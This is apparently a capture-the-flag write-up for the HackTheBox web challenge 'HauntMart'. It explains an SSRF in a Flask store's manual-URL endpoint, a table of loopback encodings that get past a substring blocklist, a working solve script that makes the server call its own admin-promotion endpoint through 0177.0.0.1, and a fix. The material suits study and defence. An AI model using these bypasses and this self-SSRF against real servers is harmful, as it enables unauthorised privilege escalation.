---
layout: post
title: "HauntMart"
date: 2027-07-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, ssrf-bypass, cwe-918, localhost-filter-bypass, octal-ip]
---

## Overview

HauntMart is an HTB Web challenge (Easy) presenting a Flask e-commerce application. The vulnerability is a [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html) on the "submit a product manual URL" endpoint. A substring blocklist rejects `127.0.0.1`, `localhost`, and `0.0.0.0` — bypassed with the octal notation `0177.0.0.1` — to reach a localhost-only admin-promotion endpoint and read the flag from the home page.

**[CWE-918](https://cwe.mitre.org/data/definitions/918.html) — Server-Side Request Forgery**

---

## The Technique

### SSRF via octal IP notation — substring blocklist bypass

The `/api/product` endpoint accepts a `manual` URL and fetches it server-side:

```python
def isSafeUrl(url):
    for hosts in ["127.0.0.1", "localhost", "0.0.0.0"]:
        if hosts in url:
            return False
    return True

def downloadManual(url):
    if isSafeUrl(url):
        r = requests.get(url)
        ...
        return True
    return False
```

`isSafeUrl` is a string-substring check. Any representation of `127.0.0.1` that doesn't contain the literal string `127.0.0.1`, `localhost`, or `0.0.0.0` passes:

| Notation | Value | Passes blocklist? |
|---|---|---|
| `127.0.0.1` | loopback | ❌ blocked |
| `localhost` | loopback | ❌ blocked |
| `0177.0.0.1` | octal → 127.0.0.1 | ✅ bypasses |
| `2130706433` | decimal → 127.0.0.1 | ✅ bypasses |
| `0x7f000001` | hex → 127.0.0.1 | ✅ bypasses |
| `[::1]` | IPv6 loopback | ✅ bypasses |

The app also exposes a `/api/addAdmin?username=<name>` route guarded by `request.remote_addr == "127.0.0.1"`. A self-SSRF through `downloadManual` satisfies that guard — the fetch originates from the loopback.

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"
s = requests.Session()

s.post(f"{BASE}/api/register", json={"username":"hacker","password":"hacker123"})
s.post(f"{BASE}/api/login", json={"username":"hacker","password":"hacker123"})

# SSRF: octal 0177.0.0.1 == 127.0.0.1, bypasses substring blocklist.
# Use internal port 1337 (not the external Docker-mapped port).
ssrf_url = "http://0177.0.0.1:1337/api/addAdmin?username=hacker"
r = s.post(f"{BASE}/api/product", json={"name":"x","price":"1","description":"x","manual":ssrf_url})
print(f"[*] SSRF: {r.status_code} {r.json()}")

s.post(f"{BASE}/api/login", json={"username":"hacker","password":"hacker123"})
r = s.get(f"{BASE}/home")
m = re.search(r'HTB\{[^}]+\}', r.text)
if m:
    print(f"\n[+] FLAG: {m.group()}")
```

```bash
python3 solve.py <host> <port>
```

---

## Why it worked

`isSafeUrl` performs a plain string-contains check on the raw URL before it is parsed or resolved. The operating system's DNS/IP stack resolves any of the alternative notations to the loopback interface at connection time — after the check. Because `"0177.0.0.1"` is not a substring of `"127.0.0.1"`, `"localhost"`, or `"0.0.0.0"`, the check returns `True` and the fetch proceeds.

The `addAdmin` endpoint trusts `request.remote_addr` as a proof of origin, but Flask's `remote_addr` on a loopback request IS `127.0.0.1`, so the guard is satisfied by the self-SSRF.

---

## Fix

Resolve the supplied hostname to an IP address **before** the blocklist check, then reject private/loopback ranges regardless of how they were written:

```python
import socket
from ipaddress import ip_address, ip_network

PRIVATE = [ip_network(r) for r in ["127.0.0.0/8","10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","::1/128"]]

def isSafeUrl(url):
    try:
        host = urllib.parse.urlparse(url).hostname
        resolved = ip_address(socket.gethostbyname(host))
        return not any(resolved in net for net in PRIVATE)
    except Exception:
        return False
```
